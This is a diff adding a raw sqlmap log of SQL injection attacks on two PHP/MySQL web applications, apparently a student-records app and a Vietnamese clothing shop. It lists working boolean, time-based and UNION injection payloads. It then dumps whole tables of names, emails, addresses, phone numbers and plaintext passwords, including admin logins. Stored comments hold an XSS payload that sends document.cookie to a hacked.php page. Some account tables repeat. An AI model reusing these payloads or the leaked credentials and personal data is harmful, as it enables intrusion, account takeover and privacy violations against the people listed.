@@ -1,0 +1,323 @@
+sqlmap identified the following injection point(s) with a total of 291 HTTP(s) requests:
+---
+Parameter: user (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=1' AND 9108=9108 AND 'amkH'='amkH
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=1' AND (SELECT 4368 FROM (SELECT(SLEEP(10)))Wsek) AND 'LVNy'='LVNy
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.65, PHP
+back-end DBMS: MySQL >= 5.0.12
+Database: db_sinhvien
+Table: account
+[15 entries]
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+| cusid | email           | power   | address           | fullname          | password | username                  | phonenumber |
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+| 1     | nch@yahoo.com   | admin   | 65-Nguyen Qui Duc | Nguyen Cong Hoang | admin    | Admin                     | 0905002124  |
+| 3     | linh@yahoo.com  | user    | 108 Ho Xuan Huong | Nguyen Ngoc Linh  | 123      | linhlogin                 | 0906123321  |
+| 6     | songa@yahoo.com | user    | Quang Binh        | Ha Duy Son        | 123456   | sonlogin                  | 0901002003  |
+| 7     | 123@123         | user    | 65nqd             | nchoang           | 123456   | hlogion                   | 012345      |
+| 8     | tien@Yahoo.com  | user    | CDCN              | Nguyen Cong Tien  | 123456   | tienlogin                 | 0123123321  |
+| 9     | hoang@yahoo.com | user    | 65 NQD            | Nguyen Hoang      | 123456   | hoang123login             | 0905939390  |
+| 10    | 123@yahoo       | user    | 123               | NK                | 123456   | kienlogin                 | 123123123   |
+| 11    | 212@ayhoo       | user    | ?a                | sda               | 123      | dung                      | 122121      |
+| 12    | nttking         | user    | nttking           | nttking           | nttking  | nttking                   | 313         |
+| 13    | test            | user    | test              | "                 | test     | test                      | test        |
+| 25    | test            | user    | test              | test              | test     | "                         | test        |
+| 26    | test            | user    | test              | test              | test     | 1                         | test        |
+| 27    | test            | user    | test              | test              | test     | "><img src=x onerror=aler | test        |
+| 39    | <blank>         | user    | <blank>           | <blank>           | <blank>  | <blank>                   | <blank>     |
+| 101   | test            | user    | test              | test              | test     |  AND (SELECT 5 FROM PG_SL | test        |
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+
+Database: db_sinhvien
+Table: text
+[0 entries]
++-------+--------+-------+--------+---------+----------+
+| catid | textid | title | bydate | content | username |
++-------+--------+-------+--------+---------+----------+
++-------+--------+-------+--------+---------+----------+
+
+Database: db_sinhvien
+Table: catid
+[2 entries]
++-------+-----------+
+| catid | cat       |
++-------+-----------+
+| 1     | Thông báo |
+| 2     | Tin T?c   |
++-------+-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=1' AND 9108=9108 AND 'amkH'='amkH
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=1' AND (SELECT 4368 FROM (SELECT(SLEEP(10)))Wsek) AND 'LVNy'='LVNy
+---
+web server operating system: Linux Debian
+web application technology: PHP, Apache 2.4.65
+back-end DBMS: MySQL >= 5.0.12
+Database: db_sinhvien
+Table: account
+[15 entries]
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+| cusid | email           | power   | address           | fullname          | password | username                  | phonenumber |
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+| 1     | nch@yahoo.com   | admin   | 65-Nguyen Qui Duc | Nguyen Cong Hoang | admin    | Admin                     | 0905002124  |
+| 3     | linh@yahoo.com  | user    | 108 Ho Xuan Huong | Nguyen Ngoc Linh  | 123      | linhlogin                 | 0906123321  |
+| 6     | songa@yahoo.com | user    | Quang Binh        | Ha Duy Son        | 123456   | sonlogin                  | 0901002003  |
+| 7     | 123@123         | user    | 65nqd             | nchoang           | 123456   | hlogion                   | 012345      |
+| 8     | tien@Yahoo.com  | user    | CDCN              | Nguyen Cong Tien  | 123456   | tienlogin                 | 0123123321  |
+| 9     | hoang@yahoo.com | user    | 65 NQD            | Nguyen Hoang      | 123456   | hoang123login             | 0905939390  |
+| 10    | 123@yahoo       | user    | 123               | NK                | 123456   | kienlogin                 | 123123123   |
+| 11    | 212@ayhoo       | user    | ?a                | sda               | 123      | dung                      | 122121      |
+| 12    | nttking         | user    | nttking           | nttking           | nttking  | nttking                   | 313         |
+| 13    | test            | user    | test              | "                 | test     | test                      | test        |
+| 25    | test            | user    | test              | test              | test     | "                         | test        |
+| 26    | test            | user    | test              | test              | test     | 1                         | test        |
+| 27    | test            | user    | test              | test              | test     | "><img src=x onerror=aler | test        |
+| 39    | <blank>         | user    | <blank>           | <blank>           | <blank>  | <blank>                   | <blank>     |
+| 101   | test            | user    | test              | test              | test     |  AND (SELECT 5 FROM PG_SL | test        |
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+
+Database: db_sinhvien
+Table: text
+[0 entries]
++-------+--------+-------+--------+---------+----------+
+| catid | textid | title | bydate | content | username |
++-------+--------+-------+--------+---------+----------+
++-------+--------+-------+--------+---------+----------+
+
+Database: db_sinhvien
+Table: catid
+[2 entries]
++-------+-----------+
+| catid | cat       |
++-------+-----------+
+| 1     | Thông báo |
+| 2     | Tin T?c   |
++-------+-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=1' AND 9108=9108 AND 'amkH'='amkH
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=1' AND (SELECT 4368 FROM (SELECT(SLEEP(10)))Wsek) AND 'LVNy'='LVNy
+---
+web server operating system: Linux Debian
+web application technology: PHP, Apache 2.4.65
+back-end DBMS: MySQL >= 5.0.12
+Database: db_sinhvien
+Table: account
+[15 entries]
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+| cusid | email           | power   | address           | fullname          | password | username                  | phonenumber |
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+| 1     | nch@yahoo.com   | admin   | 65-Nguyen Qui Duc | Nguyen Cong Hoang | admin    | Admin                     | 0905002124  |
+| 3     | linh@yahoo.com  | user    | 108 Ho Xuan Huong | Nguyen Ngoc Linh  | 123      | linhlogin                 | 0906123321  |
+| 6     | songa@yahoo.com | user    | Quang Binh        | Ha Duy Son        | 123456   | sonlogin                  | 0901002003  |
+| 7     | 123@123         | user    | 65nqd             | nchoang           | 123456   | hlogion                   | 012345      |
+| 8     | tien@Yahoo.com  | user    | CDCN              | Nguyen Cong Tien  | 123456   | tienlogin                 | 0123123321  |
+| 9     | hoang@yahoo.com | user    | 65 NQD            | Nguyen Hoang      | 123456   | hoang123login             | 0905939390  |
+| 10    | 123@yahoo       | user    | 123               | NK                | 123456   | kienlogin                 | 123123123   |
+| 11    | 212@ayhoo       | user    | ?a                | sda               | 123      | dung                      | 122121      |
+| 12    | nttking         | user    | nttking           | nttking           | nttking  | nttking                   | 313         |
+| 13    | test            | user    | test              | "                 | test     | test                      | test        |
+| 25    | test            | user    | test              | test              | test     | "                         | test        |
+| 26    | test            | user    | test              | test              | test     | 1                         | test        |
+| 27    | test            | user    | test              | test              | test     | "><img src=x onerror=aler | test        |
+| 39    | <blank>         | user    | <blank>           | <blank>           | <blank>  | <blank>                   | <blank>     |
+| 101   | test            | user    | test              | test              | test     |  AND (SELECT 5 FROM PG_SL | test        |
++-------+-----------------+---------+-------------------+-------------------+----------+---------------------------+-------------+
+
+Database: db_sinhvien
+Table: catid
+[2 entries]
++-------+-----------+
+| catid | cat       |
++-------+-----------+
+| 1     | Thông báo |
+| 2     | Tin T?c   |
++-------+-----------+
+
+Database: db_sinhvien
+Table: text
+[0 entries]
++-------+--------+-------+--------+---------+----------+
+| catid | textid | title | bydate | content | username |
++-------+--------+-------+--------+---------+----------+
++-------+--------+-------+--------+---------+----------+
+
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: idCate (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: frame=chitietsp&idCate=1' AND 6927=6927 AND 'mJye'='mJye&id=7
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: frame=chitietsp&idCate=1' AND (SELECT 8168 FROM (SELECT(SLEEP(10)))sfoo) AND 'POFW'='POFW&id=7
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: frame=chitietsp&idCate=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a6a6b71,0x6c765746454f4d6556456c76777a796c6d69746c48747259625a737a5a5675696b5a797159784d79,0x717a767671),NULL,NULL,NULL,NULL-- -&id=7
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.65, PHP
+back-end DBMS: MySQL >= 5.0.12
+Database: db_thoitrang
+Table: comment
+[6 entries]
++-----------+-----------+---------------------------------------------------------------------------------------------------+------------+
+| idComment | idProduct | content                                                                                           | userName   |
++-----------+-----------+---------------------------------------------------------------------------------------------------+------------+
+| 1         | 30        | Sản phẩm đẹp mắt, giá cả phải chăng                                                               | quangduy   |
+| 2         | 30        | sản phẩm vừa túi tiền                                                                             | quangduy98 |
+| 3         | 30        | đẹp                                                                                               | quangduy   |
+| 5         | 31        | đẹp                                                                                               | quangduy   |
+| 8         | 26        | <script>document.location="http://localhost/webdemo/hacked.php?ex="+document.cookie;</script>     | nttking    |
+| 9         | 27        | <script>document.location="http://localhost/qlthoitrang/hacked.php?ex="+document.cookie;</script> | nttking    |
++-----------+-----------+---------------------------------------------------------------------------------------------------+------------+
+
+Database: db_thoitrang
+Table: contact
+[29 entries]
++-----------+----------------------------------+-----------------------------------+
+| idContact | email                            | content                           |
++-----------+----------------------------------+-----------------------------------+
+| 27        | dinhquangduynt@gmail.com         | Shop nhiệt tình, vui vẻ           |
+| 28        | nguyenvana@gmail.com             | Sản phẩm chất lượng, hợp túi tiền |
+| 30        | <blank>                          | <blank>                           |
+| 31        | <blank>                          | <blank>                           |
+| 32        | <blank>                          | <blank>                           |
+| 33        | <blank>                          | <blank>                           |
+| 34        | <blank>                          | <blank>                           |
+| 35        | <blank>                          | <blank>                           |
+| 36        | <blank>                          | <blank>                           |
+| 37        | <blank>                          | <blank>                           |
+| 38        | <blank>                          | <blank>                           |
+| 39        | "                                | <blank>                           |
+| 40        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 41        | "                                | <blank>                           |
+| 42        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 43        | "                                | <blank>                           |
+| 44        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 45        | "                                | <blank>                           |
+| 46        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 47        | "                                | <blank>                           |
+| 48        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 49        | "                                | <blank>                           |
+| 50        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 51        | "                                | <blank>                           |
+| 52        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 53        | "                                | <blank>                           |
+| 54        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
+| 55        | "                                | <blank>                           |
+| 56        |  AND (SELECT 5 FROM PG_SLEEP(5)) | <blank>                           |
++-----------+----------------------------------+-----------------------------------+
+
+Database: db_thoitrang
+Table: invoice
+[0 entries]
++-----------+---------+----------+----------+--------------+
+| idIncoice | address | status   | name_cus | phone_number |
++-----------+---------+----------+----------+--------------+
++-----------+---------+----------+----------+--------------+
+
+Database: db_thoitrang
+Table: customer
+[4 entries]
++-------+------+--------------------------+------------------+-------------------------+----------+-----------------+--------------+
+| idCus | sex  | email                    | name             | address                 | password | username        | phone_number |
++-------+------+--------------------------+------------------+-------------------------+----------+-----------------+--------------+
+| 1     | \x01 | dinhquangduynt@gmail.com | đinh quang duy   | nguyễn văn huề, đà nẵng | quangduy | quangduy        | 0977694163   |
+| 2     | \x01 | duypro2603@gmail.com     | Đinh Quang Duy   | nguyễn văn huề đà nẵng  | quanguy  | quangduy98      | 0977694163   |
+| 3     | \x01 | quangduy                 | Đinh Quang Duydd | aaa                     | quangduy | admin@gmail.com | aaaa         |
+| 5     | \x01 | nttking1@gmail.com       | nttking          | nttking                 | nttking  | nttking         | 3231         |
++-------+------+--------------------------+------------------+-------------------------+----------+-----------------+--------------+
+
+Database: db_thoitrang
+Table: product
+[29 entries]
++-----------+------------+------------+------------------+-------------+----------+-------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| idProduct | idCategory | day        | image            | price       | quantity | product_name                        | description                                                                                                                                                                                                                                                                                                                                                               |
++-----------+------------+------------+------------------+-------------+----------+-------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 3         | 1          | 20/10/2019 | somi(1).jpg      | 499.000 VND | 10       | Áo sơ mi                            | Dáng thông thường(regular)\r\nCó mũ, tay dài                                                                                                                                                                                                                                                                                                                              |
+| 4         | 1          | 28/10/2019 | somi(2).jpg      | 599.000 VND | 5        | Áo sơ mi                            | Dáng thông thường(regular)\r\nCó mũ, tay dài                                                                                                                                                                                                                                                                                                                              |
+| 5         | 1          | 20/10/2019 | somi(3).jpg      | 300.000 VND | 14       | Áo sơ mi nam dài tay kẻ caro        | Áo sơ mi Cotton USA kẻ caro.\r\nPhom dáng regular, cổ đức, tay dài, có cúc cài trang trí ở lá cổ.\r\nPhù hợp mặc quanh năm. Mặc thoải mái, dễ chịu có thể kết hợp với quần jeans, khaki.                                                                                                                                                                                  |
+| 6         | 1          | 20/10/2019 | somi(4).jpg      | 599.000 VND | 5        | Áo sơ mi nam                        | Áo sơ mi bamboo pha kẻ caro.\r\nPhom regular, cổ đức, tay dài.\r\nĐơn giản, lịch sự rất phù hợp mặc nơi công sở. Có thể kết hợp với quần âu, quần khaki, giày tây.                                                                                                                                                                                                        |
+| 7         | 1          | 20/10/2019 | somi(5).jpg      | 300.000 VND | 12       | Áo sơ mi nam                        | Áo sơ mi denim cotton họa tiết kẻ sọc.\r\nPhom regular, cổ đức, tay dài.\r\nCó túi ngực, cài cúc phía trước.\r\nThích hợp mặc quanh năm. Kiểu dáng đơn giản, lịch sự phù hợp nhiều hoàn cảnh.\r\nCó thể phối với nhiều dáng quần: quần jeans, khak, giày lười, giày tây                                                                                                   |
+| 8         | 1          | 20/10/2019 | somi(6).jpg      | 599.000 VND | 20       | Áo sơ mi nam                        | Áo sơ mi cotton kẻ caro.\r\nPhom regular, cổ đức, tay dài.\r\nDòng hàng cơ bản bắt buộc có trong mùa.                                                                                                                                                                                                                                                                     |
+| 9         | 1          | 20/10/2019 | somi(7).jpg      | 200.000 VND | 12       | Áo sơ mi nam                        | Áo sơ mi nam                                                                                                                                                                                                                                                                                                                                                              |
+| 10        | 1          | 20/10/2019 | somi(8).jpg      | 215.000 VND | 17       | Áo sơ mi nam ngắn tay               | Áo sơ mi nam ngắn tay in họa tiết nằm trong bộ sưu tập JOURNEY TO THE EAST\r\nChất liệu linen đặc biệt mềm mại, thoáng mát\r\nVới đặc tính sợi vải không xô dạt, không phai màu nên càng sử dụng lâu, linen càng mềm mại và êm ái hơn\r\n                                                                                                                                 |
+| 11        | 2          | 20/10/2019 | aokhoac(1).jpg   | 400.000 VND | 10       | Áo khoác                            | Áo khoác nam đen                                                                                                                                                                                                                                                                                                                                                          |
+| 12        | 2          | 20/10/2019 | aokhoac(2).jpg   | 300.000 VND | 5        | Áo khoác nam                        | Áo khoác nam                                                                                                                                                                                                                                                                                                                                                              |
+| 13        | 2          | 20/10/2019 | aokhoac(3).jpg   | 500.000 VND | 9        | Áo khoác nam                        | Dáng thông thường (Regular)\r\nCHẤT LIỆU\r\n100%cotton\r\nGiặt máy ở chế độ nhẹ nhàng, nhiệt độ thông thường\r\nSử dụng hóa chất tẩy không có chất Clo\r\nSấy khô ở nhiệt độ thấp 110°, là ở nhiệt độ trung bình 150°\r\nGiặt với sản phẩm cùng màu\r\nNên phơi vắt ngang                                                                                                 |
+| 14        | 2          | 20/10/2019 | aokhoac(4).jpg   | 400.000 VND | 17       | Áo khoác nam                        | Dáng thông thường (Regular)\r\nCHẤT LIỆU\r\n80% Cotton, 13% Polyester 2% Spandex 5% Latex\r\nGiặt máy ở chế độ nhẹ, nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy có chứa Clo\r\nPhơi trong bóng mát\r\nKhông được sấy, không được là\r\nKhông được giặt khô\r\nGiặt với sản phẩm cùng màu                                                                                |
+| 15        | 2          | 20/10/2019 | aokhoac(5).jpg   | 500.000 VND | 13       | Áo khoác nam                        | Dáng thông thường (regular)\r\nSản phẩm có tính năng chống thấm nước\r\nCHẤT LIỆU\r\n100% polyester\r\nGiặt máy nhẹ nhàng, ở nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy\r\nSấy khô nhẹ nhàng, là ở nhiệt độ trung bình 150 độ C\r\nGiặt với sản phẩm cùng màu                                                                                                          |
+| 16        | 3          | 20/10/2019 | aolen(1).jpg     | 400.000 VND | 12       | ÁO GHILE LEN LÔNG CỪU NAM           | Dáng thường (regular)\r\nCHẤT LIỆU\r\n100% Wool\r\nGiặt tay ở nhiệt độ thường, không sử dụng chất tẩy\r\nGiặt mặt trái sản phẩm, phơi phẳng trong bóng mát\r\nKhông được sấy, là nhiệt độ 110 độ C\r\nGiặt với sản phẩm cùng màu                                                                                                                                          |
+| 17        | 3          | 20/10/2019 | aolen(2).jpg     | 599.000 VND | 12       | ÁO LEN NAM MỎNG CỔ TRÒN DÀI TAY     | Áo len nam trơn màu\r\nThiết kế cổ tròn, tay và gấu bo gọn gàng\r\nChất liệu mềm mại, ấm áp, không gây tích điện\r\nCHẤT LIỆU\r\n100% Cotton\r\nGiặt máy nhẹ nhàng, ở nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy\r\nSấy khô nhẹ nhàng, là ở nhiệt độ trung bình 150 độ C\r\nGiặt với sản phẩm cùng màu                                                                 |
+| 18        | 3          | 20/10/2019 | aolen(3).jpg     | 600.000 VND | 9        | Áo len nam dài tay cổ tròn          | Áo len nam dệt quả trám\r\nThiết kế cổ tròn, tay và gấu bo gọn gàng\r\nChất liệu mềm mại, ấm áp, không gây tích điện\r\nThông tin người mẫu: 1m82 & 72kg – Size quần 31, size áo: M\r\nCHẤT LIỆU\r\n100% Acrylic\r\nĐể sản phẩm nơi khô ráo\r\nTránh tiếp xúc trực tiếp với ánh nắng mặt trời và nhiệt độ cao\r\nTránh để bề mặt sản phẩm tiếp xúc với các vật sắc nhọn   |
+| 19        | 3          | 20/10/2019 | somi(4).jpg      | 450.000 VND | 5        | Áo len nam dài tay cổ tròn          | Áo sơ mi dày cổ tròn dài tay                                                                                                                                                                                                                                                                                                                                              |
+| 20        | 4          | 20/10/2019 | aochuidau(1).jpg | 125.000 VND | 12       | Áo chui dầu dài tay                 |  Áo chui đầu tay dài, cổ tròn                                                                                                                                                                                                                                                                                                                                             |
+| 21        | 4          | 20/10/2019 | aochuidau(2).jpg | 449.000 VND | 12       | ÁO HOODIES NAM                      | Áo hoodies nam dáng regular\r\nCó mũ, tay dài, in hình trẻ trung\r\nChất liệu mềm mại, thấm hút mồ hôi,co giãn thoải mái\r\nCHẤT LIỆU\r\n64% Polyester 34%cotton 2% spandex\r\nGiặt máy nhẹ nhàng, ở nhiệt độ thường\r\nKhông sử dụng hóa chất tẩy\r\nSấy khô nhẹ nhàng, là ở nhiệt độ trung bình 150 độ C\r\nGiặt với sản phẩm cùng màu                                  |
+| 22        | 4          | 20/10/2019 | aochuidau(3).jpg | 399.000 VND | 9        | Áo nỉ chui đầu nam in hình          | Áo nỉ                                                                                                                                                                                                                                                                                                                                                                     |
+| 23        | 6          | 20/10/2019 | aophong(1).jpg   | 120.000 VND | 7        | Áo phông dài tay                    | Áo thun nam dáng regular, cổ tròn, tay dài, in hình trước ngực\r\nChất liệu mềm mại, co giãn, thấm hút mồ hôi tốt, ít co ngót, bền bỉ theo năm tháng\r\nVải có nguồn gốc là Cotton US, được kiểm soát bởi hiệp hội bông US uy tín, đặc biệt khả năng truy xuất nguồn gốc đáng tin cậy nhất trong các loại bông                                                            |
+| 24        | 6          | 20/10/2019 | aophong(2).jpg   | 150.000 VND | 5        | Áo phông nam tay dài in hình mickey | Áo thun nam nằm trong bộ sưu tập Disney-Mickey\r\nDáng áo regular, cổ tròn, tay dài, in hình Mickey\r\nChất liệu Cotton US mềm mại, co giãn, thấm hút mồ hôi tốt\r\nChất liệu ít co ngót, bền bỉ theo năm tháng\r\nVải có nguồn gốc là Cotton US, được kiểm soát bởi hiệp hội bông US uy tín, đặc biệt khả năng truy xuất nguồn gốc đáng tin cậy nhất trong các loại bông |
+| 25        | 6          | 20/10/2019 | aophong(3).jpg   | 200.000 VND | 7        | Áo phông ngắn tay                   |  Áo phông ngắn tay                                                                                                                                                                                                                                                                                                                                                        |
+| 26        | 7          | 20/10/2019 | quanjean(1).jpg  | 500.000 VND | 10       | Quần jean                           | Quần jeans Cotton USA.\r\nForm Regular, cạp thường, 5 túi .\r\nCái khoá trước, khuy kim loại.\r\nPhù hợp mặc quanh năm, có thể kết hợp với áo sơ mi, polo, T-shirt, áo len                                                                                                                                                                                                |
+| 27        | 7          | 20/10/2019 | quanjean(2).jpg  | 600.000 VND | 8        | Quần jean nam                       | Quần jeans cotton co giãn.\r\nPhom slim, cạp thường, 5 túi.\r\nCái khoá trước, khuy kim loại.\r\nHiệu ứng chà bạc.\r\nPhù hợp mặc quanh năm, có thể kết hợp với áo sơ mi, polo, T-shirt, áo len                                                                                                                                                                           |
+| 28        | 7          | 20/10/2019 | quanjean(3).jpg  | 760.000 VND | 12       | Quần jean nam                       | Quần jeans cotton có co giãn.\r\nForm slim, cạp thường, 5 túi.\r\nCái khoá trước, khuy kim loại.\r\nPhù hợp mặc quanh năm, có thể kết hợp với áo sơ mi, polo, T-shirt, áo len                                                                                                                                                                                             |
+| 29        | 8          | 20/10/2019 | quanvai(1).jpg   | 300.000 VND | 7        | Quần vải nam                        | Dáng jogger                                                                                                                                                                                                                                                                                                                                                               |
+| 30        | 8          | 20/10/2019 | quanvai(2).jpg   | 190.000 VND | 10       | Quần vải nam                        | Quần vải nam                                                                                                                                                                                                                                                                                                                                                              |
+| 31        | 8          | 20/10/2019 | quanvai(3).jpg   | 200.000 VND | 8        | Quần vải nam                        | Quần vải nam                                                                                                                                                                                                                                                                                                                                                              |
++-----------+------------+------------+------------------+-------------+----------+-------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: db_thoitrang
+Table: admin
+[1 entry]
++---------+----------+----------+
+| idAdmin | password | username |
++---------+----------+----------+
+| 1       | admin    | admin    |
++---------+----------+----------+
+
+Database: db_thoitrang
+Table: invoice_detail
+[0 entries]
++-----------+-----------+-------+----------+
+| idInvoice | idProduct | price | quantity |
++-----------+-----------+-------+----------+
++-----------+-----------+-------+----------+
+
+Database: db_thoitrang
+Table: category
+[7 entries]
++------------+---------------+
+| idCategory | category_name |
++------------+---------------+
+| 1          | Áo sơ mi      |
+| 2          | Áo khoác      |
+| 3          | Áo len        |
+| 4          | Áo chui đầu   |
+| 6          | Áo phông      |
+| 7          | quần jeans    |
+| 8          | Quần vải      |
++------------+---------------+
+
